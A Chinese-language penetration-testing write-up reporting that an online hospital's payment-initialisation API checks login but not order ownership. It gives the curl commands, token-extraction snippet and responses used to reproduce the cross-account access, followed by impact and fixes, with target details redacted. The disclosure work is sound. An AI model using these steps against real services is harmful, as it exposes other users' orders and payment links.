---
title: "某互联网医院支付接口无鉴权"
date: 2026-07-22 00:00:00
categories:
  - 渗透
tags:
  - 水平越权
  - IDOR
  - 支付安全
description: "使用两个测试账号比较订单详情和支付初始化的归属校验，记录支付接口水平越权的发现与验证过程。"
cover: /images/pentest/payment-order-idor.jpg
---

> 域名、账号、订单号已隐去；响应内容有裁剪。

## 背景

测试目标是一个线上问诊业务，流程是选科室、填症状、下单、支付。

看接口的时候注意到 `/v2/business/client/order/tradeOrderPay`，支付初始化，参数只有 `orderNo` 和 `paymentType`。同一套业务里的问诊详情接口 `/v2/business/client/inquiry/quick/case/get` 传 `caseId`，会校验归属。支付接口传的是 orderNo，是否也校验，需要两个账号对比。

## 准备两个账号

A、B 两个普通用户分别登录，从 localStorage 取登录态：

```js
copy(JSON.stringify({
  token: localStorage.getItem("Med-Access-Token"),
  refreshToken: localStorage.getItem("Med-Refresh-Token"),
  clientId: localStorage.getItem("Med-ClientId")
}, null, 2))
```

`Med-Access-Token` 是请求凭证，`Med-Refresh-Token` 用来续期，`Med-ClientId` 是客户端标识。

在 WSL 里 export（`set +H` 关闭历史展开，避免 token 里的 `!` 被 bash 处理）：

```bash
set +H
BASE="https://<目标域名>"
export A_TOKEN='<A_TOKEN>' A_CLIENT_ID='<A_CLIENT_ID>'
export B_TOKEN='<B_TOKEN>' B_CLIENT_ID='<B_CLIENT_ID>'
```

确认两个号都有效：

```bash
curl -sS "$BASE/v2/user/client/user/get" \
  -H "client-type: med_h5" \
  -H "Med-Token: $A_TOKEN" \
  -H "clientId: $A_CLIENT_ID"
```

A 的回显：

```json
{"code":0,"msg":"success","data":{"userId":1001,"userName":"测*甲"}}
```

B 的回显 userId 是 1002，两个号确实不同（手机号等字段省略）。

## 各建一个订单

用 `case/create` 建未支付的快速问诊单：

```bash
A_CREATE=$(curl -sS "$BASE/v2/business/client/inquiry/quick/case/create" \
  -H "Content-Type: application/json" \
  -H "client-type: med_h5" \
  -H "Med-Token: $A_TOKEN" \
  -H "clientId: $A_CLIENT_ID" \
  --data '{"symptom":"验证A","userName":"测试甲","sex":1,"age":30,
           "picUrls":[],"source":"all","channelCode":"wx_Applet","paymentType":13}')

A_CASEID=$(echo "$A_CREATE" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["caseId"])')
A_ORDERNO=$(echo "$A_CREATE" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["orderNo"])')
```

A 的回显：

```json
{"code":0,"msg":"success","data":{
  "caseId":31001,
  "orderNo":"T2024081500001",
  "payAmount":500
}}
```

B 同样建一单，拿到 `B_CASEID=31002`、`B_ORDERNO=T2024081500002`，金额 800。

## 确认详情接口有归属校验

A 查自己的单：

```json
{"code":0,"msg":"success","data":{"id":31001,"orderNo":"T2024081500001","status":1}}
```

A 查 B 的单：

```json
{"code":90000,"msg":"用户没有权限访问该问诊单"}
```

B 查 A 的单，同样返回 `90000`。这一步确认了 B 的单子不属于 A，后面支付接口的对比才有意义。

## 支付接口三组请求

**不登录**

```bash
curl -sS "$BASE/v2/business/client/order/tradeOrderPay" \
  -H "Content-Type: application/json" \
  -H "client-type: med_h5" \
  --data '{"orderNo":"'"$A_ORDERNO"'","paymentType":13}'
```

回显：

```json
{"code":1004,"msg":"未登录"}
```

接口有登录校验。

**本人订单**

A 的 token 加 A_ORDERNO：

```json
{"code":0,"msg":"success","data":{
  "payAmount":500,
  "payFlag":true,
  "state":0,
  "webUrl":"https://wx.tenpay.com/cgi-bin/mmpayweb-bin/checkmweb?..."
}}
```

**交叉**

A 的 token 加 B_ORDERNO：

```bash
curl -sS "$BASE/v2/business/client/order/tradeOrderPay" \
  -H "Content-Type: application/json" \
  -H "client-type: med_h5" \
  -H "Med-Token: $A_TOKEN" \
  -H "clientId: $A_CLIENT_ID" \
  --data '{"orderNo":"'"$B_ORDERNO"'","paymentType":13}'
```

回显：

```json
{"code":0,"msg":"success","data":{
  "payAmount":800,
  "payFlag":true,
  "state":0,
  "webUrl":"https://wx.tenpay.com/cgi-bin/mmpayweb-bin/checkmweb?..."
}}
```

payAmount 是 800，和 B 那单的金额一致，说明返回的是 B 的订单数据。反方向 B 的 token 加 A_ORDERNO，同样 `code=0`、返回 500。

返回的 webUrl 直接打开可以拉起微信支付，我只验证到接口返回，没有继续往下点。

## 结论

`tradeOrderPay` 只校验登录态，没校验 orderNo 是否属于当前用户。从响应看，接口拿到 orderNo 后直接按单号查订单并初始化支付，token 里的 userId 只用来判断"是否登录"。

## 影响

1. 用别人的 orderNo 可以生成对方的支付链接，替对方走一遍支付初始化；
2. 响应里带 `payAmount`、`state`、`payFlag`，能看到订单金额和支付状态；
3. orderNo 看起来不像随机 UUID，如果能从通知、跳转链接或列表接口拿到，就可以批量操作待支付订单。

## 修复

1. `tradeOrderPay` 用 token 解析出的 userId 校验 orderNo 归属，只允许订单所有者调用；
2. 非本人订单直接返回无权限，不返回 `payAmount`、`payFlag`、`webUrl`；
3. 支付、退款、取消、详情统一走同一套归属校验，不要每个接口各写一份；
4. orderNo 用不可预测的生成规则。

---

## 验证截图

![双账号订单归属与支付初始化的对照测试](/images/pentest/payment-order-proof.png)
